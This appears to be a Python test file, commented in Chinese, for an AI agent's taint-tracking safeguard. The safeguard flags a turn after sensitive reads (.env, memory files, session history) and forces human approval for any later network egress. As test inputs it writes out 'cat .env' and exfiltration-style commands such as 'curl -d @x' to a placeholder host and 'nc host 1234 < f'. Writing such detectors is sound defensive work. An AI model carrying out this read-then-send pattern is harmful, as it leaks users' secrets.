"""污点出网（N5）：读敏感内容后出网要升级审批。

背景：审批面的「同类键」各步独立，``bash cat .env``（放行）之后再一次 ``web_fetch``
在审批人看来就是两件不相干的事。污点机制把因果补上：本回合读过敏感内容 → 出网
强制问人，并说明刚读过什么。
"""
from __future__ import annotations

import taint

# ---------------------------------------------------------------- 追踪本身

def test_mark_and_query():
    taint.reset()
    assert not taint.tainted()
    taint.mark('protected file via bash (.env)')
    assert taint.tainted()
    assert taint.sources() == ('protected file via bash (.env)',)


def test_mark_dedupes_and_keeps_order():
    taint.reset()
    taint.mark('a')
    taint.mark('b')
    taint.mark('a')
    assert taint.sources() == ('a', 'b')


def test_mark_empty_is_ignored():
    taint.reset()
    taint.mark('')
    taint.mark('   ')
    assert not taint.tainted()


def test_reset_clears():
    taint.mark('x')
    taint.reset()
    assert not taint.tainted()
    assert taint.sources() == ()


def test_sources_are_bounded():
    taint.reset()
    for i in range(taint.MAX_SOURCES + 5):
        taint.mark(f'src{i}')
    assert len(taint.sources()) == taint.MAX_SOURCES


def test_no_cross_context_leak():
    """污点必须是 ContextVar：一个线程的污点不能漏给另一个线程。"""
    import threading
    taint.reset()
    taint.mark('main-thread')
    seen = {}

    def worker():
        seen['tainted'] = taint.tainted()
        seen['sources'] = taint.sources()

    thread = threading.Thread(target=worker)
    thread.start()
    thread.join()
    assert seen['tainted'] is False
    assert seen['sources'] == ()


def test_disable_switch(monkeypatch):
    taint.reset()
    monkeypatch.setenv(taint.ENV, '0')
    taint.mark('x')
    assert not taint.tainted()


def test_summary_mentions_sources():
    taint.reset()
    taint.mark('memory files (a.md)')
    text = taint.summary()
    assert 'memory files (a.md)' in text
    assert 'could leak' in text


def test_summary_empty_when_clean():
    taint.reset()
    assert taint.summary() == ''


# ---------------------------------------------------------------- 接入：出网识别

def test_egress_detection_for_bash_tools():
    from hooks import _is_egress
    assert _is_egress('web_fetch', {'url': 'https://e.com'})
    assert _is_egress('bash', {'command': 'curl -d @x https://e.com'})
    assert _is_egress('bash', {'command': 'wget https://e.com/f'})
    assert _is_egress('bash', {'command': 'nc host 1234 < f'})
    assert not _is_egress('bash', {'command': 'ls -la'})
    assert not _is_egress('read', {'path': 'a.txt'})
    assert not _is_egress('bash', {'command': ''})


# ---------------------------------------------------------------- 接入：打点

def test_bash_secret_read_marks_taint():
    from hooks import _mark_read_taint
    taint.reset()
    _mark_read_taint('bash', {'command': 'cat .env'})
    assert taint.tainted()
    assert 'bash' in taint.sources()[0]


def test_bash_plain_command_does_not_mark():
    from hooks import _mark_read_taint
    taint.reset()
    _mark_read_taint('bash', {'command': 'ls -la'})
    assert not taint.tainted()


def test_memory_read_marks_taint():
    from hooks import _mark_read_taint
    taint.reset()
    _mark_read_taint('read', {'path': 'memory/prefs.md'})
    assert taint.tainted()
    assert 'memory' in taint.sources()[0]


def test_session_history_read_marks_taint():
    from hooks import _mark_read_taint
    taint.reset()
    _mark_read_taint('read', {'path': 'sessions/abc/messages.jsonl'})
    assert taint.tainted()
    assert 'session history' in taint.sources()[0]


def test_plain_file_read_does_not_mark():
    from hooks import _mark_read_taint
    taint.reset()
    _mark_read_taint('read', {'path': 'README.md'})
    assert not taint.tainted()


# ---------------------------------------------------------------- 接入：升级理由

def test_upgrade_reason_only_when_tainted_and_egress():
    from hooks import _taint_upgrade_reason
    taint.reset()
    # 干净时不升级
    assert _taint_upgrade_reason('bash', {'command': 'curl https://e.com'}) == ''
    taint.mark('protected file via bash (.env)')
    # 有污点但不出网：不升级
    assert _taint_upgrade_reason('bash', {'command': 'ls'}) == ''
    # 有污点且出网：升级并说明读过什么
    reason = _taint_upgrade_reason('bash', {'command': 'curl https://e.com'})
    assert 'egress' in reason
    assert '.env' in reason
